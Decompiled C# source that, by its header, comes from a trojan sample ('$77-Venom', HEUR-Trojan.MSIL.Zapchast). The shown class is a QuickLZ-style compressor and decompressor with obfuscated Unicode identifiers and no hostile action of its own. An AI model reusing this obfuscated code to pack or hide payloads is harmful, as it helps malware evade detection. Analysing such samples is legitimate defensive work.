// Decompiled with JetBrains decompiler
// Type: 싾蜇ᤣ汦⟙훊✦䲡ῠ㳚�줩ੂ芎ᶎ䅹罵壑
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;

public static class 싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑
{
  public const int 栔氽ѐ\uFFFD蒕셿喕謅뵤㜓㯥ڙ㪊깋\uF2BB쨦ꠃ拀臘妜 = 1;
  public const int ඉ\uE6EE蘟\uE728\u09DB짶\uE5BE\uF83E據歋\uE54A뢪廧䞲õ\uA7C1\u208C\uE317槩ᚥ = 5;
  public const int \u066D앪ષ胟좰\uE43D࣯\u1ACC쓝텾홆\u02C4䓡\u320A\u29EB䎢尺탄\u28BEᵻ = 0;
  public const int \u1094\u24F2\u13F7ɬ랰ˑ㞉\u23FA圱ᙲ㧸鞇랭㧯\u2B2C펦퓾\u2B57\u2EE8ڴ = 0;
  public const int 簐໕\u2B58뛇蓺ⅺ\u1A8D쏣룼ﴞ\uE5E5䴷찘\u2A59픃荗ꫂꅸ\uE3EC윘 = 0;
  private const int 剦᭙㽆䣧媂庽듪섆\u2E8Cୈ笞樅行\uFFFD庲Ά㓨尷臡真 = 4096;
  private const int 뜠\uF896뢢愀\uF6FEݑ鞹ﳑ큍嵀䁅ﰸ\u0E7DἚ䏪\uE510ꍑ\uE11E씮琮 = 2;
  private const int 栬銍\uF2B1孻栿\u2FBEጒ휒烏봺\uEFCA묑\uE594\u2ABD쪦슊殎ꘌ\uF750賀 = 6;
  private const int 륦뢑\u19FEꉼ廽\u263B䕇䖜ﾋ푯甬貔\uFFFD慫蔪\uE725檍窭舺虤 = 4;
  private const int \uFFFDꡀ꺕쎼湻\uEE8D쨶螨陱晴등ᇥꮀ濝䧄쑴俍蚛睿ặ = 4;
  private const int ﴍ\uE78F\uF249툟袌긏瞍竔\u1C8E뉷窣净㒛뵶Ꭶ죝磅ප羛朴 = 9;
  private const int 吡㶫盃ﶎ\uF2A9ꇧ\u22E5㸧빜\u27C6糛ۑ牽ॵ폱醄塰\uFFFD\uF6FE갸 = 1;
  private const int 沯ⱺ観\u2865\u2F9A䃡ᢇ엇獮\u2A8D䫵㝆㙡ຫ콖廌\uEC77䏪彆\u0F15 = 16;

  private static int ꍕ㬏弿\u0FBE㝻适\u1FD4ଝ䬜럏\uE693ⴒ\u32A3ფ嫙呂起ᖇᤏ\u2F95(byte[] source) => ((int) source[0] & 2) != 2 ? 3 : 9;

  public static int \uAACB仫哥屎䏒\uFFFD\uFFFD䯬蓡ﬆ施붆䏬ဍꄊᕮ쇗㐋흓悴(byte[] source) => 싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.ꍕ㬏弿\u0FBE㝻适\u1FD4ଝ䬜럏\uE693ⴒ\u32A3ფ嫙呂起ᖇᤏ\u2F95(source) == 9 ? (int) source[5] | (int) source[6] << 8 | (int) source[7] << 16 | (int) source[8] << 24 : (int) source[2];

  public static int \uF1FD\uFFFD鶾\uEB01뇍\u26A7\u10C8鉛察ᮅ뮩\uFFFD眄\u259D\uF037\u27AAต䑳\uF66F樎(
    byte[] source)
  {
    return 싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.ꍕ㬏弿\u0FBE㝻适\u1FD4ଝ䬜럏\uE693ⴒ\u32A3ფ嫙呂起ᖇᤏ\u2F95(source) == 9 ? (int) source[1] | (int) source[2] << 8 | (int) source[3] << 16 | (int) source[4] << 24 : (int) source[1];
  }

  private static void \uF312\uEA76\uFBCC༤ﾖ\uE2D1ﺏ豃௧ꕭ\uF2E1윱癟䍰婥聝컒쿎勱䆬(
    byte[] dst,
    int level,
    bool compressible,
    int sizeCompressed,
    int sizeDecompressed)
  {
    dst[0] = (byte) (2 | (compressible ? 1 : 0));
    dst[0] |= (byte) (level << 2);
    dst[0] |= (byte) 64;
    dst[0] |= (byte) 0;
    싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(dst, 1, sizeDecompressed, 4);
    싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(dst, 5, sizeCompressed, 4);
  }

  public static byte[] 浆鉱V蘄Ⰴ\u291Fઁ\u339Cᮼ滝ኗ偯鞀仢汢晼혀䙬\u0861퇀(byte[] source, int level = 3)
  {
    if (source.Length == 0)
      return new byte[0];
    int[,] numArray1;
    if (level != 1)
    {
      if (level != 3)
        throw new ArgumentException("C# version only supports level 1 and 3");
      numArray1 = new int[4096, 16];
    }
    else
      numArray1 = new int[4096, 1];
    int index1 = 0;
    int length = 13;
    uint num1 = 2147483648;
    int i = 9;
    byte[] numArray2 = new byte[source.Length + 400];
    int[] numArray3 = new int[4096];
    byte[] numArray4 = new byte[4096];
    int num2 = 0;
    int num3 = source.Length - 6 - 4 - 1;
    int num4 = 0;
    if (index1 <= num3)
      num2 = (int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16;
    while (index1 <= num3)
    {
      if (((int) num1 & 1) == 1)
      {
        if (index1 > source.Length >> 1 && length > index1 - (index1 >> 5))
        {
          byte[] numArray5 = new byte[source.Length + 9];
          싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.\uF312\uEA76\uFBCC༤ﾖ\uE2D1ﺏ豃௧ꕭ\uF2E1윱癟䍰婥聝컒쿎勱䆬(numArray5, level, false, source.Length, source.Length + 9);
          Array.Copy((Array) source, 0, (Array) numArray5, 9, source.Length);
          return numArray5;
        }
        싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(numArray2, i, (int) (num1 >> 1) | int.MinValue, 4);
        i = length;
        length += 4;
        num1 = 2147483648U;
      }
      if (level == 1)
      {
        int index2 = (num2 >> 12 ^ num2) & 4095;
        int num5 = numArray1[index2, 0];
        int num6 = numArray3[index2] ^ num2;
        numArray3[index2] = num2;
        numArray1[index2, 0] = index1;
        if (num6 == 0 && numArray4[index2] != (byte) 0 && (index1 - num5 > 2 || index1 == num5 + 1 && num4 >= 3 && index1 > 3 && (int) source[index1] == (int) source[index1 - 3] && (int) source[index1] == (int) source[index1 - 2] && (int) source[index1] == (int) source[index1 - 1] && (int) source[index1] == (int) source[index1 + 1] && (int) source[index1] == (int) source[index1 + 2]))
        {
          num1 = num1 >> 1 | 2147483648U;
          if ((int) source[num5 + 3] != (int) source[index1 + 3])
          {
            int num7 = 1 | index2 << 4;
            numArray2[length] = (byte) num7;
            numArray2[length + 1] = (byte) (num7 >> 8);
            index1 += 3;
            length += 2;
          }
          else
          {
            int num8 = index1;
            int num9 = source.Length - 4 - index1 + 1 - 1 > (int) byte.MaxValue ? (int) byte.MaxValue : source.Length - 4 - index1 + 1 - 1;
            index1 += 4;
            if ((int) source[num5 + index1 - num8] == (int) source[index1])
            {
              ++index1;
              if ((int) source[num5 + index1 - num8] == (int) source[index1])
              {
                ++index1;
                while ((int) source[num5 + (index1 - num8)] == (int) source[index1] && index1 - num8 < num9)
                  ++index1;
              }
            }
            int num10 = index1 - num8;
            int num11 = index2 << 4;
            if (num10 < 18)
            {
              int num12 = num11 | num10 - 2;
              numArray2[length] = (byte) num12;
              numArray2[length + 1] = (byte) (num12 >> 8);
              length += 2;
            }
            else
            {
              싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(numArray2, length, num11 | num10 << 16, 3);
              length += 3;
            }
          }
          num2 = (int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16;
          num4 = 0;
        }
        else
        {
          ++num4;
          numArray4[index2] = (byte) 1;
          numArray2[length] = source[index1];
          num1 >>= 1;
          ++index1;
          ++length;
          num2 = num2 >> 8 & (int) ushort.MaxValue | (int) source[index1 + 2] << 16;
        }
      }
      else
      {
        num2 = (int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16;
        int num13 = source.Length - 4 - index1 + 1 - 1 > (int) byte.MaxValue ? (int) byte.MaxValue : source.Length - 4 - index1 + 1 - 1;
        int index3 = (num2 >> 12 ^ num2) & 4095;
        byte num14 = numArray4[index3];
        int num15 = 0;
        int num16 = 0;
        for (int index4 = 0; index4 < 16 && (int) num14 > index4; ++index4)
        {
          int index5 = numArray1[index3, index4];
          if ((int) (byte) num2 == (int) source[index5] && (int) (byte) (num2 >> 8) == (int) source[index5 + 1] && (int) (byte) (num2 >> 16) == (int) source[index5 + 2] && index5 < index1 - 2)
          {
            int num17 = 3;
            while ((int) source[index5 + num17] == (int) source[index1 + num17] && num17 < num13)
              ++num17;
            if (num17 > num15 || num17 == num15 && index5 > num16)
            {
              num16 = index5;
              num15 = num17;
            }
          }
        }
        int num18 = num16;
        numArray1[index3, (int) num14 & 15] = index1;
        byte num19 = (byte) ((uint) num14 + 1U);
        numArray4[index3] = num19;
        if (num15 >= 3 && index1 - num18 < 131071)
        {
          int num20 = index1 - num18;
          for (int index6 = 1; index6 < num15; ++index6)
          {
            num2 = (int) source[index1 + index6] | (int) source[index1 + index6 + 1] << 8 | (int) source[index1 + index6 + 2] << 16;
            int index7 = (num2 >> 12 ^ num2) & 4095;
            byte num21 = numArray4[index7]++;
            numArray1[index7, (int) num21 & 15] = index1 + index6;
          }
          index1 += num15;
          num1 = num1 >> 1 | 2147483648U;
          if (num15 == 3 && num20 <= 63)
          {
            싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(numArray2, length, num20 << 2, 1);
            ++length;
          }
          else if (num15 == 3 && num20 <= 16383)
          {
            싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(numArray2, length, num20 << 2 | 1, 2);
            length += 2;
          }
          else if (num15 <= 18 && num20 <= 1023)
          {
            싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(numArray2, length, num15 - 3 << 2 | num20 << 6 | 2, 2);
            length += 2;
          }
          else if (num15 <= 33)
          {
            싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(numArray2, length, num15 - 2 << 2 | num20 << 7 | 3, 3);
            length += 3;
          }
          else
          {
            싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(numArray2, length, num15 - 3 << 7 | num20 << 15 | 3, 4);
            length += 4;
          }
          num4 = 0;
        }
        else
        {
          numArray2[length] = source[index1];
          num1 >>= 1;
          ++index1;
          ++length;
        }
      }
    }
    while (index1 <= source.Length - 1)
    {
      if (((int) num1 & 1) == 1)
      {
        싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(numArray2, i, (int) (num1 >> 1) | int.MinValue, 4);
        i = length;
        length += 4;
        num1 = 2147483648U;
      }
      numArray2[length] = source[index1];
      ++index1;
      ++length;
      num1 >>= 1;
    }
    while (((int) num1 & 1) != 1)
      num1 >>= 1;
    싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(numArray2, i, (int) (num1 >> 1) | int.MinValue, 4);
    싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.\uF312\uEA76\uFBCC༤ﾖ\uE2D1ﺏ豃௧ꕭ\uF2E1윱癟䍰婥聝컒쿎勱䆬(numArray2, level, true, source.Length, length);
    byte[] destinationArray = new byte[length];
    Array.Copy((Array) numArray2, (Array) destinationArray, length);
    return destinationArray;
  }

  private static void 颽穪\uFFFD珦発䢊叏髄㙷讬魴\uF482\uF85A\u2616\u2BAF쥯펢썦\u33C0\u2679(
    byte[] a,
    int i,
    int value,
    int numbytes)
  {
    for (int index = 0; index < numbytes; ++index)
      a[i + index] = (byte) (value >> index * 8);
  }

  public static byte[] 禕\uFFFD\uFFFD䄗鷁纅揚\u2620\uFFF0䳏\uE6DB醥槊ꈷ倊㝮갖㣴狟퇬(byte[] source)
  {
    if (source.Length == 0)
      return new byte[0];
    int num1 = (int) source[0] >> 2 & 3;
    switch (num1)
    {
      case 1:
      case 3:
        int length = 싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.\uAACB仫哥屎䏒\uFFFD\uFFFD䯬蓡ﬆ施붆䏬ဍꄊᕮ쇗㐋흓悴(source);
        int index1 = 싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.ꍕ㬏弿\u0FBE㝻适\u1FD4ଝ䬜럏\uE693ⴒ\u32A3ფ嫙呂起ᖇᤏ\u2F95(source);
        int index2 = 0;
        uint num2 = 1;
        byte[] numArray1 = new byte[length];
        int[] numArray2 = new int[4096];
        byte[] numArray3 = new byte[4096];
        int num3 = length - 6 - 4 - 1;
        int index3 = -1;
        uint num4 = 0;
        if (((int) source[0] & 1) != 1)
        {
          byte[] destinationArray = new byte[length];
          Array.Copy((Array) source, 싾蜇ᤣ汦\uF694\u27D9훊\u2726䲡ῠ㳚\uFFFD줩ੂ芎ᶎ䅹罵\uE26F壑.ꍕ㬏弿\u0FBE㝻适\u1FD4ଝ䬜럏\uE693ⴒ\u32A3ფ嫙呂起ᖇᤏ\u2F95(source), (Array) destinationArray, 0, length);
          return destinationArray;
        }
        while (true)
        {
          if (num2 == 1U)
          {
            num2 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
            index1 += 4;
            if (index2 <= num3)
              num4 = num1 != 1 ? (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24) : (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16);
          }
          if (((int) num2 & 1) == 1)
          {
            num2 >>= 1;
            uint index4;
            uint num5;
            if (num1 == 1)
            {
              int index5 = (int) num4 >> 4 & 4095;
              index4 = (uint) numArray2[index5];
              if (((int) num4 & 15) != 0)
              {
                num5 = (uint) (((int) num4 & 15) + 2);
                index1 += 2;
              }
              else
              {
                num5 = (uint) source[index1 + 2];
                index1 += 3;
              }
            }
            else
            {
              uint num6;
              if (((int) num4 & 3) == 0)
              {
                num6 = (num4 & (uint) byte.MaxValue) >> 2;
                num5 = 3U;
                ++index1;
              }
              else if (((int) num4 & 2) == 0)
              {
                num6 = (num4 & (uint) ushort.MaxValue) >> 2;
                num5 = 3U;
                index1 += 2;
              }
              else if (((int) num4 & 1) == 0)
              {
                num6 = (num4 & (uint) ushort.MaxValue) >> 6;
                num5 = (uint) (((int) (num4 >> 2) & 15) + 3);
                index1 += 2;
              }
              else if (((int) num4 & (int) sbyte.MaxValue) != 3)
              {
                num6 = num4 >> 7 & 131071U;
                num5 = (uint) (((int) (num4 >> 2) & 31) + 2);
                index1 += 3;
              }
              else
              {
                num6 = num4 >> 15;
                num5 = (uint) (((int) (num4 >> 7) & (int) byte.MaxValue) + 3);
                index1 += 4;
              }
              index4 = (uint) ((ulong) index2 - (ulong) num6);
            }
            numArray1[index2] = numArray1[(int) index4];
            numArray1[index2 + 1] = numArray1[(int) index4 + 1];
            numArray1[index2 + 2] = numArray1[(int) index4 + 2];
            for (int index6 = 3; (long) index6 < (long) num5; ++index6)
              numArray1[index2 + index6] = numArray1[(long) index4 + (long) index6];
            index2 += (int) num5;
            if (num1 == 1)
            {
              uint num7 = (uint) ((int) numArray1[index3 + 1] | (int) numArray1[index3 + 2] << 8 | (int) numArray1[index3 + 3] << 16);
              while ((long) index3 < (long) index2 - (long) num5)
              {
                ++index3;
                int index7 = ((int) (num7 >> 12) ^ (int) num7) & 4095;
                numArray2[index7] = index3;
                numArray3[index7] = (byte) 1;
                num7 = (uint) ((ulong) (num7 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) numArray1[index3 + 3] << 16));
              }
              num4 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16);
            }
            else
              num4 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
            index3 = index2 - 1;
          }
          else if (index2 <= num3)
          {
            numArray1[index2] = source[index1];
            ++index2;
            ++index1;
            num2 >>= 1;
            if (num1 == 1)
            {
              while (index3 < index2 - 3)
              {
                ++index3;
                int num8 = (int) numArray1[index3] | (int) numArray1[index3 + 1] << 8 | (int) numArray1[index3 + 2] << 16;
                int index8 = (num8 >> 12 ^ num8) & 4095;
                numArray2[index8] = index3;
                numArray3[index8] = (byte) 1;
              }
              num4 = (uint) ((ulong) (num4 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) source[index1 + 2] << 16));
            }
            else
              num4 = (uint) ((ulong) (num4 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) source[index1 + 2] << 16) | (ulong) ((int) source[index1 + 3] << 24));
          }
          else
            break;
        }
        while (index2 <= length - 1)
        {
          if (num2 == 1U)
          {
            index1 += 4;
            num2 = 2147483648U;
          }
          numArray1[index2] = source[index1];
          ++index2;
          ++index1;
          num2 >>= 1;
        }
        return numArray1;
      default:
        throw new ArgumentException("C# version only supports level 1 and 3");
    }
  }
}
